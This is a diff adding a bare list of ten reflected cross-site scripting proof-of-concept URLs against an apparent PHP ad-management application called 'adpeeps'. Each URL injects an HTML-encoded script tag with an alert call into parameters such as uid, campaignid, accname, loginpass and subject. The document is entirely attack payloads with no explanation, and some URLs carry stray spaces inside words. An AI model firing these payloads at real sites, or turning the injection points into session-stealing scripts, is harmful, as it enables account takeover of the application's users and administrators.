@@ -1,0 +1,10 @@
+http://www.example.com/adpeeps/index.php?uid=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=login_lookup&amp;uid=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=adminlogin&amp;uid=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=createcampaign&amp;mode=new&amp;uid=100000&amp;c ampaignid=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=view_account_stats&amp;uid=100000&amp;type=&quot; &gt;&lt;script&gt;alert(2)&lt;/script&gt;&amp;period=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=view_adrates&amp;uid=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=account_confirmation&amp;accname=&quot;&gt;&lt;scri pt&gt;alert(1)&lt;/script&gt;&amp;loginpass=&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;&amp;uid=100000
+http://www.example.com/adpeeps/index.php?loc=setup_account&amp;e6=new&amp;e12=bypass&amp;e9=&quot; &gt;&lt;script&gt;alert(0)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=email_advertisers&amp;uid=100000&amp;mode=1&amp; errors=&amp;from=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;message=&amp;subject=&quot;&gt;&lt;script&gt;alert(2)&lt;/script&gt;
+http://www.example.com/adpeeps/index.php?loc=edit_ad_package&amp;uid=100000&amp;idno=&quot;&gt;&lt;s cript&gt;alert(0)&lt;/script&gt;
